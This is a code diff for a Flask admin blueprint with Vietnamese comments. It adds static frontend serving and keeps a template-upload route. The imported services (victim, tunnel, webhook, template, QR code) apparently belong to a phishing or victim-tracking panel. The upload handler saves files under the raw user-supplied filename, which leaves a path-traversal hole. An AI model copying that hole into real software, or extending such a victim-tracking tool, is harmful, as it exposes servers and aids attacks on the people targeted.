@@ -1,4 +1,7 @@
-from flask import Blueprint, request, jsonify, Response
+import os
+import queue
+import json
+from flask import Blueprint, request, jsonify, Response, send_from_directory
 from core.tunnel_service import TunnelService
 from core.victim_service import VictimService
 from core.template_service import TemplateService
@@ -6,11 +9,18 @@ from core.webhook_service import WebhookService
 from core.config_service import ConfigService
 from utils.sse_manager import SSEManager
 from utils.qr_code import generate_qr_base64
-import queue
-import json
 
-admin_bp = Blueprint('admin', __name__)
+# Xác định đường dẫn tuyệt đối đến thư mục frontend
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+FRONTEND_DIR = os.path.join(BASE_DIR, '..', '..', 'frontend')
 
+admin_bp = Blueprint('admin', __name__,
+                     static_folder=FRONTEND_DIR,
+                     static_url_path='/static')
+
+# ============================================================
+# API (giữ nguyên các endpoint, đảm bảo import đúng service)
+# ============================================================
 @admin_bp.route('/api/tunnels', methods=['GET'])
 def get_tunnels():
     status = request.args.get('status')
@@ -77,7 +87,8 @@ def upload_template():
     if file.filename == '':
         return jsonify({"success": False, "error": "Tên file trống"}), 400
     from config import TEMPLATES_DIR
-    filepath = os.path.join(TEMPLATES_DIR, file.filename)
+    import os as _os
+    filepath = _os.path.join(TEMPLATES_DIR, file.filename)
     file.save(filepath)
     template_svc = admin_bp.app.config['template_service']
     template_svc.sync_files()
@@ -123,3 +134,15 @@ def stream():
         except GeneratorExit:
             SSEManager.unregister(q)
     return Response(event_stream(), mimetype="text/event-stream")
+
+# ============================================================
+# Frontend – phục vụ giao diện chính
+# ============================================================
+@admin_bp.route('/')
+def serve_index():
+    return send_from_directory(FRONTEND_DIR, 'index.html')
+
+@admin_bp.route('/<path:path>')
+def serve_static(path):
+    # Cho phép truy cập file tĩnh như css, js
+    return send_from_directory(FRONTEND_DIR, path)
